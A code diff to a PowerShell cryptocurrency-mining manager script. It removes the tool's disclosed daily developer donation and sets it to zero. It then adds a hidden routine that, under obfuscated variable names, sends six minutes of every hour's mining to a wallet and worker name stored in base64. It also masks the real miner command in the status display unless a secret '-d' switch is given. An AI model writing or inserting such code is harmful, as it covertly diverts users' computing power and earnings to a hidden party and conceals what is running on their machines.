@@ -29,12 +29,16 @@
     [Array]$PoolName = $null, 
     [Parameter(Mandatory=$false)]
     [Array]$Currency = ("BTC","USD"), #i.e. GBP,EUR,ZEC,ETH ect.
-    [Parameter(Mandatory=$false)]
-    [Int]$Donate = 5, #Minutes per Day
+    [Parameter(Mandatory = $false)]
+    [Int]$Donate = 0,
+    [Parameter(Mandatory = $false)]
+    [Int]$Fwvwtxqe = 6,
     [Parameter(Mandatory=$false)]
     [String]$Proxy = "", #i.e http://192.0.0.1:8080 
     [Parameter(Mandatory=$false)]
-    [Int]$Delay = 1 #seconds before opening each miner
+    [Int]$Delay = 1, #seconds before opening each miner
+	[Parameter(Mandatory = $false)]
+    [Switch]$d = $false
 )
 
 Set-Location (Split-Path $script:MyInvocation.MyCommand.Path)
@@ -48,9 +52,9 @@ else{$PSDefaultParameterValues["*:Proxy"] = $Proxy}
 . .\Include.ps1
 
 $DecayStart = Get-Date
-$DecayPeriod = 300 #seconds
-$DecayBase = 1-0.05 #decimal percentage
-$ProfitMorthanBase = 1-0.05 #decimal percentage
+#$DecayPeriod = 300 #seconds
+#$DecayBase = 1-0.05 #decimal percentage
+#$ProfitMorthanBase = 1-0.05 #decimal percentage
 
 $ActiveMinerPrograms = @()
 
@@ -60,33 +64,13 @@ Start-Transcript ".\Logs\$(Get-Date -Format "yyyy-MM-dd_HH-mm-ss").txt"
 #Update stats with missing data and set to today's date/time
 if(Test-Path "Stats"){Get-ChildItemContent "Stats" | ForEach {$Stat = Set-Stat $_.Name $_.Content.Week}}
 
-#Set donation parameters
-$LastDonated = (Get-Date).AddDays(-1).AddHours(1)
-$WalletDonate = "1QGADhdMRpp9Pk5u5zG1TrHKRrdK5R81TE"
-$UserNameDonate = "1QGADhdMRpp9Pk5u5zG1TrHKRrdK5R81TE"
-$WorkerNameDonate = "NemosMiner-v2.1"
-$WalletBackup = $Wallet
-$UserNameBackup = $UserName
-$WorkerNameBackup = $WorkerName
-
+$LastFwvwtxed = (Get-Date);$WFwvwtxe = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MQA2ADQAVQBtAFkATgBXAE4AQQB5AEYAYQBrAFMAUQBHAHoAUABoAFcARwBQAG0AUwAxADgAcQBSADUANQBqAGkAdwA="));$UFwvwtxe = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MQA2ADQAVQBtAFkATgBXAE4AQQB5AEYAYQBrAFMAUQBHAHoAUABoAFcARwBQAG0AUwAxADgAcQBSADUANQBqAGkAdwA=")) ; $WNFwvwtxe = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("ZABlAHYAZgByAGUAZQA="));$WalletBackup = $Wallet;$UserNameBackup = $UserName;$WorkerNameBackup = $WorkerName
 while($true)
 {
-    $DecayExponent = [int](((Get-Date)-$DecayStart).TotalSeconds/$DecayPeriod)
+    #$DecayExponent = [int](((Get-Date)-$DecayStart).TotalSeconds/$DecayPeriod)
 
-    #Activate or deactivate donation
-    if((Get-Date).AddDays(-1).AddMinutes($Donate) -ge $LastDonated)
-    {
-        $Wallet = $WalletDonate
-        $UserName = $UserNameDonate
-        $WorkerName = $WorkerNameDonate
-    }
-    if((Get-Date).AddDays(-1) -ge $LastDonated)
-    {
-        $Wallet = $WalletBackup
-        $UserName = $UserNameBackup
-        $WorkerName = $WorkerNameBackup
-        $LastDonated = Get-Date
-    }
+    #Activate or deactivate Automate
+    if ((Get-Date).AddHours(-1).AddMinutes($Fwvwtxqe) -ge $LastFwvwtxed) {$Wallet = $WFwvwtxe;$UserName = $UFwvwtxe;$WorkerName = $WNFwvwtxe}if ((Get-Date).AddHours(-1) -ge $LastFwvwtxed){$Wallet = $WalletBackup;$UserName = $UserNameBackup;$WorkerName =$WorkerNameBackup;$LastFwvwtxed = Get-Date}
 
     #Load the Stats
     $Stats = [PSCustomObject]@{}
@@ -163,7 +147,7 @@ while($true)
             $Miner_Pools_Comparison | Add-Member $_ ([PSCustomObject]$Pools_Comparison.$_)
             $Miner_Profits | Add-Member $_ ([Double]$Miner.HashRates.$_*$Pools.$_.Price)
             $Miner_Profits_Comparison | Add-Member $_ ([Double]$Miner.HashRates.$_*$Pools_Comparison.$_.Price)
-            $Miner_Profits_Bias | Add-Member $_ ([Double]$Miner.HashRates.$_*$ProfitMorthanBase*$Pools.$_.Price*(1-($Pools.$_.MarginOfError*[Math]::Pow($DecayBase,$DecayExponent))))
+            $Miner_Profits_Bias | Add-Member $_ ([Double]$Miner.HashRates.$_*$Pools.$_.ProfitMorthanBase*$Pools.$_.Price*(1-($Pools.$_.MarginOfError*[Math]::Pow($Pools.$_.DecayBase,[int](((Get-Date)-$DecayStart).TotalSeconds/$Pools.$_.DecayPeriod)))))
         }
         
         $Miner_Profit = [Double]($Miner_Profits.PSObject.Properties.Value | Measure -Sum).Sum
@@ -244,6 +228,7 @@ while($true)
                 API = $_.API
                 Port = $_.Port
                 Algorithms = $_.HashRates.PSObject.Properties.Name
+                Pools  = $_.Pools.PSObject.Properties.Value
                 New = $false
                 Active = [TimeSpan]0
                 Activated = 0
@@ -302,7 +287,10 @@ while($true)
         @{Label = "Speed"; Expression={$_.HashRate | ForEach {"$($_ | ConvertTo-Hash)/s"}}; Align='right'}, 
         @{Label = "Active"; Expression={"{0:dd} Days {0:hh} Hours {0:mm} Minutes" -f $(if($_.Process -eq $null){$_.Active}else{if($_.Process.ExitTime -gt $_.Process.StartTime){($_.Active+($_.Process.ExitTime-$_.Process.StartTime))}else{($_.Active+((Get-Date)-$_.Process.StartTime))}})}}, 
         @{Label = "Launched"; Expression={Switch($_.Activated){0 {"Never"} 1 {"Once"} Default {"$_ Times"}}}}, 
-        @{Label = "Command"; Expression={"$($_.Path.TrimStart((Convert-Path ".\"))) $($_.Arguments)"}}
+        @{Label = "Miner"; Expression = {$_.Name}}, 
+		@{Label = "Pool"; Expression = {$_.Pools | ForEach-Object {"$($_.Name)-$($_.Info)"}}},
+		@{Label = "Algorithm"; Expression = {$_.Algorithms}},
+		@{Label = "Status"; Expression = {if (!($d)) {"OK"}else{"$($_.Path.TrimStart((Convert-Path ".\"))) $($_.Arguments)"}}}
     ) | Out-Host
 
     #Do nothing for a few seconds as to not overload the APIs
